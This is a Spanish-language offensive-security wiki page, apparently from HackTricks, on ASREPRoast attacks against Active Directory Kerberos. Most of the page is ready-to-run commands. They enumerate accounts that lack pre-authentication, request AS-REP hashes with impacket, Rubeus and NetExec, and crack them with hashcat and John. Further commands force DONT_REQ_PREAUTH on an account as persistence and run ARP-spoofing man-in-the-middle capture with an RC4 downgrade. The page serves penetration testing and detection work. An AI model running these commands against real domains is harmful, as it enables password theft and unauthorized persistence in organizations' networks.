# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota a usuarios que no tienen el **atributo Kerberos pre-authentication required**. En esencia, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario al Domain Controller (DC) sin necesitar la contraseña del usuario. Luego, el DC responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar crack offline para descubrir la contraseña del usuario.

Los requisitos principales para este ataque son:

- **Falta de Kerberos pre-authentication**: los usuarios objetivo no deben tener esta función de seguridad habilitada.
- **Conexión al Domain Controller (DC)**: los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Cuenta de dominio opcional**: tener una cuenta de dominio permite a los atacantes identificar de forma más eficiente a los usuarios vulnerables mediante consultas LDAP. Sin esa cuenta, los atacantes deben adivinar nombres de usuario.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus solicita **RC4** por defecto, así que Event ID **4768** normalmente muestra **preauth type 0** y **ticket encryption type 0x17**. Si añades **`/aes`** (o RC4 está deshabilitado para el objetivo), espera **AES etypes** en su lugar.

#### Quick one-liners (Linux)

- Enumera primero los posibles objetivos (p. ej., desde rutas de compilación leakadas) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast a toda una lista de nombres de usuario sin credenciales válidas usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- Si sí tienes credenciales, deja que NetExec consulte LDAP y solicite por ti cada cuenta roastable: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- Si la salida empieza con **`$krb5asrep$23$`**, crackéalo con Hashcat **`-m 18200`**. Si empieza con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, preferir John **`--format=krb5asrep`**.

### Cracking

No asumas que cada AS-REP roast es RC4. Las herramientas modernas pueden devolver **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) según el enctype solicitado/negociado. **`hashcat -m 18200`** es para **etype 23**, mientras que **John** maneja `krb5asrep` directamente para **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Forzar que **preauth** no sea requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sin credenciales

Un atacante puede usar una posición de man-in-the-middle para capturar paquetes AS-REP mientras atraviesan la red sin depender de que Kerberos pre-authentication esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
Si quieres el truco relacionado sin credenciales que devuelve un **service ticket** en lugar de un **TGT** desde un principal sin preauth, consulta [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. El modo `relay` es el interesante ofensivamente porque puede forzar **RC4** cuando el cliente sigue anunciando **etype 23**; `listen` se mantiene pasivo y solo captura lo que el cliente/DC negoció.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
